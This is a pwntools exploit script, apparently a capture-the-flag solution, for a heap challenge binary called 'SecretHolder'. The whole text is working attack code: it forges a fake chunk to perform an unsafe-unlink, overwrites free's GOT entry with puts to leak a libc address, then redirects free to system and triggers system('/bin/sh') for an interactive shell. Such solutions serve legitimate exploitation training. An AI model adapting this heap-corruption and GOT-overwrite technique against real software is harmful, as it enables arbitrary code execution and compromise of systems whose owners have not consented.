
```
from pwn import *
from LibcSearcher import *

sh = process('./SecretHolder')
elf = ELF('./SecretHolder')

# The address of huge_secret
huge_secret = 0x6020A8
bss_addr = 0x602090
free_got = elf.got['free']
puts_plt = elf.plt['puts']
read_got = elf.got['read']

def new(h_type, content):
   sh.sendlineafter('3. Renew secret', '1')
   sh.sendlineafter('3. Huge secret', str(h_type))
   sh.sendlineafter('Tell me your secret:', content)

def delete(h_type):
   sh.sendlineafter('3. Renew secret', '2')
   sh.sendlineafter('3. Huge secret', str(h_type))

def edit(h_type, content):
   sh.sendlineafter('3. Renew secret', '3')
   sh.sendlineafter('3. Huge secret', str(h_type))
   sh.sendafter('Tell me your secret:', content)

# apply one big chunk
new(3,'a'*0x100)
delete(3)

# apply one small chunk
new(1,'b'*0x10)

#apply one medium chunk
new(2,'c'*0x100)

# free chunk0 and chunk1
delete(1)
delete(2)

# create fake chunk
fake_chunk = p64(0) + p64(0x21)
#fd,bk
fake_chunk += p64(huge_secret-0x18) + p64(huge_secret-0x10)
payload = fake_chunk.ljust(0x20,'\x00')
#prev_size size
payload += p64(0x20) + p64(0x90) + 'c'*0x80   #chunk2
#prev_size size
payload += p64(0x90) + p64(0x81) + 'd'*0x70   #chunk3
#prev_size size
payload += p64(0) + p64(0x81)   #chunk4
# reapply big chunk
new(3, payload)

# unlink this 3 big bin
delete(2)
# Now, we can control this three heap pointer, modify them first
payload += p64(0) * 2 + p64(free_got) + p64(bss_addr) + p64(read_got) +p32(1)*3
edit(3,payload)

# modify free's got to put's plt
edit(2,p64(puts_plt))
#leakage the address of read
delete(1)
sh.recvuntil('\n')
read_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00'))
libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print ('libc_base=',hex(read_addr))
print ('system_addr=',hex(system_addr))
#modify table got of free and point to system
edit(2,p64(system_addr))
#modify heap1 pointer and point to str(/bin/sh)
edit(3,p64(0) * 2 + p64(binsh_addr))
#system("/bin/sh")
delete(2)

sh.interactive()
```
